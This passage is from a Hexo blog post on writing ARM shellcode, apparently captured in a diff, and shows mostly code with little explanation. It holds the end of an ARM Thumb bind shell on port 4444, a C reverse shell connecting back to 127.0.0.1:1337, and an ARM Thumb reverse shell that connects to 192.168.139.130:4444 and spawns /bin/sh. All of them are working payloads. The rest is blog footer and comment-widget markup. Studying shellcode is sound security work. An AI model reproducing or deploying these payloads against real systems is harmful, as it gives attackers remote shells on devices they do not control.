listen(sockfd, 0) </span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r0</span>, <span class="built_in">r4</span>           <span class="comment">// set r0 to saved host_sockid</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r1</span>, <span class="number">#2</span>        </span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">r7</span>, <span class="number">#2</span>           <span class="comment">// r7 = 284 (listen syscall number) </span></span><br><span class="line">    <span class="keyword">svc</span> <span class="number">#1</span>        </span><br><span class="line"></span><br><span class="line"><span class="comment">// accept(sockfd, NULL, NULL); </span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r0</span>, <span class="built_in">r4</span>           <span class="comment">// set r0 to saved host_sockid</span></span><br><span class="line">    <span class="keyword">sub</span> <span class="built_in">r1</span>, <span class="built_in">r1</span>, <span class="built_in">r1</span>       <span class="comment">// set r1 to null</span></span><br><span class="line">    <span class="keyword">sub</span> <span class="built_in">r2</span>, <span class="built_in">r2</span>, <span class="built_in">r2</span>       <span class="comment">// set r2 to null</span></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">r7</span>, <span class="number">#1</span>           <span class="comment">// r7 = 284+1 = 285 (accept syscall)</span></span><br><span class="line">    <span class="keyword">svc</span> <span class="number">#1</span>               <span class="comment">// r0 = client_sockid value</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r4</span>, <span class="built_in">r0</span>           <span class="comment">// save new client_sockid value to r4  </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">cmp</span> r</span><br><span class="line"><span class="comment">// dup2(sockfd, 0) </span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r7</span>, <span class="number">#63</span>         <span class="comment">// r7 = 63 (dup2 syscall number) </span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r0</span>, <span class="built_in">r4</span>          <span class="comment">// r4 is the saved client_sockid </span></span><br><span class="line">    <span class="keyword">sub</span> <span class="built_in">r1</span>, <span class="built_in">r1</span>, <span class="built_in">r1</span>      <span class="comment">// r1 = 0 (stdin) </span></span><br><span class="line">    <span class="keyword">svc</span> <span class="number">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// dup2(sockfd, 1)</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r0</span>, <span class="built_in">r4</span>          <span class="comment">// r4 is the saved client_sockid </span></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">r1</span>, <span class="number">#1</span>          <span class="comment">// r1 = 1 (stdout) </span></span><br><span class="line">    <span class="keyword">svc</span> <span class="number">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// dup2(sockfd, 2) </span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r0</span>, <span class="built_in">r4</span>          <span class="comment">// r4 is the saved client_sockid</span></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">r1</span>, <span class="number">#1</span>          <span class="comment">// r1 = 2 (stderr) </span></span><br><span class="line">    <span class="keyword">svc</span> <span class="number">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// execve(&quot;/bin/sh&quot;, 0, 0) </span></span><br><span class="line">    <span class="keyword">adr</span> <span class="built_in">r0</span>, shellcode   <span class="comment">// r0 = location of &quot;/bin/shX&quot;</span></span><br><span class="line">    <span class="keyword">eor</span> <span class="built_in">r1</span>, <span class="built_in">r1</span>, <span class="built_in">r1</span>      <span class="comment">// clear register r1. R1 = 0</span></span><br><span class="line">    <span class="keyword">eor</span> <span class="built_in">r2</span>, <span class="built_in">r2</span>, <span class="built_in">r2</span>      <span class="comment">// clear register r2. r2 = 0</span></span><br><span class="line">    <span class="keyword">strb</span> <span class="built_in">r2</span>, [<span class="built_in">r0</span>, <span class="number">#7</span>]   <span class="comment">// store null-byte for AF_INET</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r7</span>, <span class="number">#11</span>         <span class="comment">// execve syscall number</span></span><br><span class="line">    <span class="keyword">svc</span> <span class="number">#1</span></span><br><span class="line">    <span class="keyword">nop</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">struct_addr:</span></span><br><span class="line"><span class="symbol">.ascii</span> <span class="string">&quot;\x02\xff&quot;</span> <span class="comment">// AF_INET 0xff will be NULLed </span></span><br><span class="line"><span class="symbol">.ascii</span> <span class="string">&quot;\x11\x5c&quot;</span> <span class="comment">// port number 4444 </span></span><br><span class="line"><span class="symbol">.byte</span> <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span> <span class="comment">// IP Address </span></span><br><span class="line"><span class="symbol">shellcode:</span></span><br><span class="line"><span class="symbol">.ascii</span> <span class="string">&quot;/bin/shX&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="reverse-shellcode"><a href="#reverse-shellcode" class="headerlink" title="reverse shellcode"></a>reverse shellcode</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">int</span> sockfd; <span class="comment">// socket file descriptor</span></span><br><span class="line"> <span class="keyword">socklen_t</span> socklen; <span class="comment">// socket-length for new connections</span></span><br><span class="line"> </span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span> <span class="comment">// client address</span></span><br><span class="line"> </span><br><span class="line"> addr.sin_family = AF_INET; <span class="comment">// server socket type address family = internet protocol address</span></span><br><span class="line"> addr.sin_port = <span class="built_in">htons</span>( <span class="number">1337</span> ); <span class="comment">// connect-back port, converted to network byte order</span></span><br><span class="line"> addr.sin_addr.s_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>); <span class="comment">// connect-back ip , converted to network byte order</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">// create new TCP socket</span></span><br><span class="line"> sockfd = <span class="built_in">socket</span>( AF_INET, SOCK_STREAM, IPPROTO_IP );</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// connect socket</span></span><br><span class="line"> <span class="built_in">connect</span>(sockfd, (struct sockaddr *)&amp;addr, <span class="built_in"><span class="keyword">sizeof</span></span>(addr));</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//  Duplicate file descriptors for STDIN, STDOUT and STDERR</span></span><br><span class="line"> <span class="built_in">dup2</span>(sockfd, <span class="number">0</span>);</span><br><span class="line"> <span class="built_in">dup2</span>(sockfd, <span class="number">1</span>);</span><br><span class="line"> <span class="built_in">dup2</span>(sockfd, <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// spawn shell</span></span><br><span class="line"> <span class="built_in">execve</span>( <span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.section</span> <span class="meta">.text</span></span><br><span class="line"><span class="symbol">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"> <span class="meta">.ARM</span></span><br><span class="line"> <span class="keyword">add</span>   <span class="built_in">r3</span>, <span class="built_in">pc</span>, <span class="number">#1</span>       <span class="comment">// switch to thumb mode </span></span><br><span class="line"> <span class="keyword">bx</span>    <span class="built_in">r3</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">.THUMB</span></span><br><span class="line"><span class="comment">// socket(2, 1, 0) </span></span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r0</span>, <span class="number">#2</span></span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r1</span>, <span class="number">#1</span></span><br><span class="line"> <span class="keyword">sub</span>   <span class="built_in">r2</span>, <span class="built_in">r2</span></span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r7</span>, <span class="number">#200</span></span><br><span class="line"> <span class="keyword">add</span>   <span class="built_in">r7</span>, <span class="number">#81</span>         <span class="comment">// r7 = 281 (socket) </span></span><br><span class="line"> <span class="keyword">svc</span>   <span class="number">#1</span>              <span class="comment">// r0 = resultant sockfd </span></span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r4</span>, <span class="built_in">r0</span>          <span class="comment">// save sockfd in r4 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// connect(r0, &amp;sockaddr, 16) </span></span><br><span class="line"> <span class="keyword">adr</span>   <span class="built_in">r1</span>, struct        <span class="comment">// pointer to address, port </span></span><br><span class="line"> <span class="keyword">strb</span>  <span class="built_in">r2</span>, [<span class="built_in">r1</span>, <span class="number">#1</span>]    <span class="comment">// write 0 for AF_INET </span></span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r2</span>, <span class="number">#16</span></span><br><span class="line"> <span class="keyword">add</span>   <span class="built_in">r7</span>, <span class="number">#2</span>          <span class="comment">// r7 = 283 (connect) </span></span><br><span class="line"> <span class="keyword">svc</span>   <span class="number">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// dup2(sockfd, 0) </span></span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r7</span>, <span class="number">#63</span>         <span class="comment">// r7 = 63 (dup2) </span></span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r0</span>, <span class="built_in">r4</span>          <span class="comment">// r4 is the saved sockfd </span></span><br><span class="line"> <span class="keyword">sub</span>   <span class="built_in">r1</span>, <span class="built_in">r1</span>          <span class="comment">// r1 = 0 (stdin) </span></span><br><span class="line"> <span class="keyword">svc</span>   <span class="number">#1</span></span><br><span class="line"><span class="comment">// dup2(sockfd, 1) </span></span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r0</span>, <span class="built_in">r4</span>          <span class="comment">// r4 is the saved sockfd </span></span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r1</span>, <span class="number">#1</span>          <span class="comment">// r1 = 1 (stdout) </span></span><br><span class="line"> <span class="keyword">svc</span>   <span class="number">#1</span></span><br><span class="line"><span class="comment">// dup2(sockfd, 2) </span></span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r0</span>, <span class="built_in">r4</span>         <span class="comment">// r4 is the saved sockfd </span></span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r1</span>, <span class="number">#2</span>         <span class="comment">// r1 = 2 (stderr)</span></span><br><span class="line"> <span class="keyword">svc</span>   <span class="number">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// execve(&quot;/bin/sh&quot;, 0, 0) </span></span><br><span class="line"> <span class="keyword">adr</span>   <span class="built_in">r0</span>, binsh</span><br><span class="line"> <span class="keyword">sub</span>   <span class="built_in">r2</span>, <span class="built_in">r2</span></span><br><span class="line"> <span class="keyword">sub</span>   <span class="built_in">r1</span>, <span class="built_in">r1</span></span><br><span class="line"> <span class="keyword">strb</span>  <span class="built_in">r2</span>, [<span class="built_in">r0</span>, <span class="number">#7</span>]</span><br><span class="line"> <span class="keyword">mov</span>   <span class="built_in">r7</span>, <span class="number">#11</span>       <span class="comment">// r7 = 11 (execve) </span></span><br><span class="line"> <span class="keyword">svc</span>   <span class="number">#1</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">struct:</span></span><br><span class="line"><span class="symbol">.ascii</span> <span class="string">&quot;\x02\xff&quot;</span>      <span class="comment">// AF_INET 0xff will be NULLed </span></span><br><span class="line"><span class="symbol">.ascii</span> <span class="string">&quot;\x11\x5c&quot;</span>      <span class="comment">// port number 4444 </span></span><br><span class="line"><span class="symbol">.byte</span> <span class="number">192</span>,<span class="number">168</span>,<span class="number">139</span>,<span class="number">130</span>  <span class="comment">// IP Address </span></span><br><span class="line"><span class="symbol">binsh:</span></span><br><span class="line"><span class="symbol">.ascii</span> <span class="string">&quot;/bin/shX&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/blog/2021/08/16/ARM%20Shellcode%E7%9A%84%E7%BC%96%E5%86%99/" class="leancloud-visitors view" data-flag-title="ARM Shellcode">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/blog/2021/08/17/CVE-2019-6250/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/blog/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/blog/2021/08/11/Arm Instractions/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"xx","appKey":"xx","placeholder":"提交评论时留下邮箱收到回复后将自动通知","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"]}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "提交评论时留下邮箱收到回复后将自动通知",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2021-08-16 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/blog/tags/漏洞分析/">漏洞分析<span>7</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2021 P1AIN0&#39;S BLOG
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/blog/js/jquery.imagesloaded.min.js"></script>
+<script src="/blog/js/gallery.js"></script>
+<script src="/blog/js/bootstrap.min.js"></script>
+<script src="/blog/js/main.js"></script>
+<script src="/blog/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/blog/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/blog/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
